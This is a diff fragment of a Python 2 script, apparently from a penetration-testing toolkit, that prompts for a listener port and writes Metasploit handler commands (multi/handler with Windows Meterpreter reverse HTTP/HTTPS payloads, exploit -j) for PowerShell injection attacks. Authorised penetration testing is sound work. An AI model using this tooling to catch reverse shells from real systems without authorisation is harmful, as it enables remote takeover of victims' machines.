@@ -15,26 +15,36 @@ else:
     filewrite = file("src/program_junk/ipaddr.file", "w")
     filewrite.write(ipaddr)
 
-if os.path.isfile("src/program_junk/port.options"):
-    fileopen = file("src/program_junk/port.options", "r")
-    port = fileopen.read()
-
-else: 
-    filewrite=file("src/program_junk/port.options", "w")
-    port = raw_input("Enter the port number for the reverse [443]: ")
-    if port == "":
-        port = "443"
-    filewrite.write(port)
-
-
 powershell_inject_x64 = check_config("POWERSHELL_INJECT_PAYLOAD_X64=")
 powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")
-print_status("Generating x64-based powershell injection code...")
 
 if validate_ip(ipaddr) == False:
-	powershell_inject_x64 = "windows/meterpreter/reverse_https"
-	powershell_inject_x86 = "windows/meterpreter/reverse_http"
+        powershell_inject_x64 = "windows/meterpreter/reverse_https"
+        powershell_inject_x86 = "windows/meterpreter/reverse_http"
 
+# prompt what port to listen on for powershell then make an append to the current 
+# metasploit answer file
+if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
+	print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
+	port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
+	if port == "": port = "443"
+	fileopen = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "r")
+	data = fileopen.read()
+	match = re.search(port, data)
+	if not match:
+		filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
+		filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, port))
+		filewrite.close()
+
+if not os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
+	if os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
+		fileopen = file("%s/src/program_junk/port.options" % (definepath), "r")
+		port = fileopen.read()
+
+	if not os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
+		port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
+
+print_status("Generating x64-based powershell injection code...")
 x64 = ""
 x86 = ""
 
